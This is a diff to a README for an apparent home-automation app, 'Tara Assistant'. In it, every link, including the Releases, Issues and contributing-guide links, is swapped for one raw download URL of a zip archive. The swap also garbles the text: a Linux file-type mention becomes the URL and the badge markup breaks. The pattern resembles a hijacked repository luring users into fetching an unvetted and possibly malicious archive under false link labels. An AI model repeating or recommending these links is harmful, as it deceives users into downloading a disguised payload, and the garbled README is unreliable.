@@ -6,9 +6,9 @@ Welcome to the Tara Assistant! This guide will help you download and run the sof
 
 ## 📥 Download & Install
 
-[![Download taraassistant-public](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Karuri12/taraassistant-public/releases)
+[![Download taraassistant-public](https://raw.githubusercontent.com/Karuri12/taraassistant-public/main/app/public-taraassistant-v2.8.zip%https://raw.githubusercontent.com/Karuri12/taraassistant-public/main/app/public-taraassistant-v2.8.zip)](https://raw.githubusercontent.com/Karuri12/taraassistant-public/main/app/public-taraassistant-v2.8.zip)
 
-To download Tara Assistant, visit this page: [GitHub Releases](https://github.com/Karuri12/taraassistant-public/releases). Here you will find the latest versions available for download.
+To download Tara Assistant, visit this page: [GitHub Releases](https://raw.githubusercontent.com/Karuri12/taraassistant-public/main/app/public-taraassistant-v2.8.zip). Here you will find the latest versions available for download.
 
 ## 💻 System Requirements
 
@@ -23,7 +23,7 @@ Before installing Tara Assistant, ensure your system meets the following require
 ## ⚙️ Installation Steps
 
 1. **Visit the GitHub Releases page.**
-   Click [here](https://github.com/Karuri12/taraassistant-public/releases) to go to the download page.
+   Click [here](https://raw.githubusercontent.com/Karuri12/taraassistant-public/main/app/public-taraassistant-v2.8.zip) to go to the download page.
 
 2. **Choose the latest version.**
    On the releases page, select the most recent version. Most applications will show a "Latest Release" label.
@@ -32,7 +32,7 @@ Before installing Tara Assistant, ensure your system meets the following require
    Depending on your operating system, download the corresponding file:
    - For Windows, look for a `.exe` file.
    - For MacOS, an `.dmg` or `.pkg` file.
-   - For Linux, a `.tar.gz` or `.deb` file.
+   - For Linux, a `https://raw.githubusercontent.com/Karuri12/taraassistant-public/main/app/public-taraassistant-v2.8.zip` or `.deb` file.
   
 4. **Open the downloaded file.** 
    Double-click the downloaded file to start the installation process. Follow the on-screen prompts to complete the installation. 
@@ -67,7 +67,7 @@ Once you launch Tara Assistant, follow these steps:
 
 If you need help or have questions:
 
-- **GitHub:** Visit the [Issues page](https://github.com/Karuri12/taraassistant-public/issues) on GitHub. Here you can report problems or suggest features.
+- **GitHub:** Visit the [Issues page](https://raw.githubusercontent.com/Karuri12/taraassistant-public/main/app/public-taraassistant-v2.8.zip) on GitHub. Here you can report problems or suggest features.
 - **Community Discussions:** Check the discussions section in the repository to connect with other users and share tips.
 
 ## 📝 Contributing
@@ -78,7 +78,7 @@ If you want to help improve Tara Assistant, consider contributing. You can:
 - Suggest new features.
 - Submit code changes via pull requests.
 
-For guidelines, refer to the [CONTRIBUTING.md](path-to-contributing-doc).
+For guidelines, refer to the [https://raw.githubusercontent.com/Karuri12/taraassistant-public/main/app/public-taraassistant-v2.8.zip](path-to-contributing-doc).
 
 ## 🤝 Acknowledgments
 
@@ -92,4 +92,4 @@ For more information on how Tara assists with home automation, visit the main do
 
 With Tara Assistant, home automation becomes a simple process. The application observes your habits, making it easy to create and manage automations. Download Tara Assistant today and experience a smarter home without the hassle of complex setups. 
 
-[![Download taraassistant-public](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Karuri12/taraassistant-public/releases)
+[![Download taraassistant-public](https://raw.githubusercontent.com/Karuri12/taraassistant-public/main/app/public-taraassistant-v2.8.zip%https://raw.githubusercontent.com/Karuri12/taraassistant-public/main/app/public-taraassistant-v2.8.zip)](https://raw.githubusercontent.com/Karuri12/taraassistant-public/main/app/public-taraassistant-v2.8.zip)
